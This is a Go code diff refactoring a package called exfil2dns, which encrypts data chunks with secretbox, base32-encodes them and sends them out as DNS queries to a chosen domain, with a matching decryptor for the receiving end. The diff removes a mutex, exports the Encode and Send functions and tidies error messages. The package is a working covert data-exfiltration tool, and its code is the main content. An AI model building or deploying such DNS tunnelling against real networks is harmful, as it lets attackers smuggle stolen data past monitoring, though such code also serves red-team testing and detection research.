@@ -1,10 +1,10 @@
-// Package exfil2dns is used to exfiltrate strings using encoded DNS queries to 
+// Package exfil2dns is used to exfiltrate strings using encoded DNS queries to
 // a specified domain.
 //
 // Notes
 //
 // This is not meant to be "the best" or "most descrete" exfiltration over DNS
-// solution. There are certainly better ways to do this, but this is a very 
+// solution. There are certainly better ways to do this, but this is a very
 // simple and straightfoward example of what's possible.
 //
 // Exfil over DNS
@@ -60,7 +60,6 @@ import (
 	"log"
 	"net"
 	"strings"
-	"sync"
 
 	"golang.org/x/crypto/nacl/secretbox"
 )
@@ -72,14 +71,12 @@ type (
 		target, domain, server string
 		key                    [32]byte
 		chunkSize              int
-		l                      *sync.Mutex
 	}
 
-	// Server contains the parameters required to decrypt messages from the 
-	// exfil client. Use NewServer() to initialize.
-	Server struct {
+	// Decryptor contains the parameters required to decrypt messages from the
+	// exfil client. Use NewDecryptor() to initialize.
+	Decryptor struct {
 		key [32]byte
-		l   *sync.Mutex
 	}
 )
 
@@ -117,16 +114,14 @@ func NewDevClient(
 		key:       sha256.Sum256([]byte(password)),
 		server:    server,
 		chunkSize: chunkSize,
-		l:         new(sync.Mutex),
 	}, nil
 }
 
-// NewServer initializes Server and returs a pointer to it.
+// NewDecryptor initializes Server and returs a pointer to it.
 // Password is hashed with SHA256.
-func NewServer(password string) *Server {
-	return &Server{
+func NewDecryptor(password string) *Decryptor {
+	return &Decryptor{
 		key: sha256.Sum256([]byte(password)),
-		l:   new(sync.Mutex),
 	}
 }
 
@@ -139,9 +134,6 @@ func (c *Client) ExfilString(payload string) error {
 // Chunk lengths are declared when a client is initialized. Each chunk is
 // encrypted, encoded, and sent as an individual query.
 func (c *Client) Exfil(payload []byte) error {
-	c.l.Lock()
-	defer c.l.Unlock()
-
 	/* Read and chunk payload */
 	in := bytes.NewReader(payload)
 	chunk := make([]byte, c.chunkSize)
@@ -149,29 +141,33 @@ func (c *Client) Exfil(payload []byte) error {
 		l, err := in.Read(chunk)
 		if l != 0 {
 			/* Encode and query the DNS server */
-			q, err := c.send(c.encode(chunk[:l]))
+			q, err := c.Send(c.Encode(chunk[:l]))
 			if err != nil {
-				return fmt.Errorf("Unable to query: %s. %v", q, err)
+				return fmt.Errorf("unable to query: %s. %v", q, err)
 			}
 		}
 		if errors.Is(err, io.EOF) {
 			break
 		}
 		if err != nil {
-			return fmt.Errorf("Payload read error: %v", err)
+			return fmt.Errorf("payload read error: %v", err)
 		}
 	}
 	return nil
 }
 
-// encode takes a chunk and encrypts it with secretbox and builds a query. Each
-// time encode is called, a unique nonce is created.
-func (c *Client) encode(chunk []byte) string {
+// Encode takes a chunk and encrypts it with secretbox and builds a query. Each
+// time encode is called, a unique nonce is created. If something breaks here
+// a log.Fatal() is called, as whatever broke will also cause other problems.
+func (c *Client) Encode(chunk []byte) string {
+	if len(chunk) > c.chunkSize {
+		log.Fatalf("chunk too large, have %d, want %d", len(chunk), c.chunkSize)
+	}
 
 	/* Generate nonce */
 	var nonce [24]byte
 	if _, err := rand.Read(nonce[:]); nil != err {
-		log.Fatalf("Unable to get nonce: %v", err)
+		log.Fatalf("unable to get nonce: %v", err)
 	}
 
 	/* Encrypt chunk */
@@ -186,10 +182,13 @@ func (c *Client) encode(chunk []byte) string {
 	)
 }
 
-// send takes a query string and queries the system's DNS resolver.
-// Note: For development, it is possible to specify a custom DNS server, however
-// this implementation is considered a hack and shouldn't be relied on.
-func (c *Client) send(query string) (string, error) {
+// Send takes a query string and queries the system's DNS resolver. No input
+// validation is performed here. When calling this function directly, use at
+// your own risk.
+// Note: For development, it is possible to specify a custom DNS server when
+// initializing the client, however this implementation is considered a hack and
+// shouldn't be relied on.
+func (c *Client) Send(query string) (string, error) {
 	var resolver *net.Resolver
 
 	/* If a custom DNS server is specified, use it (Development/Testing) */
@@ -206,9 +205,7 @@ func (c *Client) send(query string) (string, error) {
 			},
 		}
 	}
-
 	_, err := resolver.LookupIPAddr(context.Background(), query)
-
 	var de *net.DNSError
 	if err != nil && !(errors.As(err, &de) && de.IsNotFound) {
 		return "", fmt.Errorf("error resolving %s: %v", query, err)
@@ -218,7 +215,7 @@ func (c *Client) send(query string) (string, error) {
 
 // Decode takes a query string recieved and returns a 2 element string slice.
 // Index 0 is the name of the target recieved and index 1 is the payload.
-func (s *Server) Decode(query string) ([2]string, error) {
+func (d *Decryptor) Decode(query string) ([2]string, error) {
 	/* Convert query string to upper case and split into the first 4 parts */
 	parts := strings.SplitN(strings.ToUpper(query), ".", 4)
 	if len(parts) < 4 {
@@ -228,36 +225,36 @@ func (s *Server) Decode(query string) ([2]string, error) {
 	/* Decode payload */
 	payload, err := b32.DecodeString(parts[0])
 	if err != nil {
-		return [2]string{}, 
-		fmt.Errorf("[%s] Error decoding payload: %v", query, err),
+		return [2]string{},
+			fmt.Errorf("[%s] Error decoding payload: %v", query, err)
 	}
 
 	/* Decode target */
 	target, err := b32.DecodeString(parts[1])
 	if err != nil {
-		return [2]string{}, 
-		fmt.Errorf("[%s] Error decoding target: %v", query, err),
+		return [2]string{},
+			fmt.Errorf("[%s] Error decoding target: %v", query, err)
 	}
 
 	/* Decode and verify nonce */
 	var nonce [24]byte
 	l, err := b32.Decode(nonce[:], []byte(parts[2]))
 	if err != nil {
-		return [2]string{}, 
-		fmt.Errorf("[%s] Error decoding nonce: %v", query, err),
+		return [2]string{},
+			fmt.Errorf("[%s] Error decoding nonce: %v", query, err)
 	}
 
 	if l != len(nonce) {
 		return [2]string{}, fmt.Errorf(
-			"[%s] Error reading nonce. Want %d bytes, got %d",
+			"[%s] Error reading nonce, have %d bytes, want %d",
 			query,
-			len(nonce),
 			l,
+			len(nonce),
 		)
 	}
 
 	/* Decrypt payload */
-	decrypted, ok := secretbox.Open([]byte{}, payload, &nonce, &s.key)
+	decrypted, ok := secretbox.Open([]byte{}, payload, &nonce, &d.key)
 	if !ok {
 		return [2]string{}, fmt.Errorf("[%s] Error decrypting payload", query)
 	}
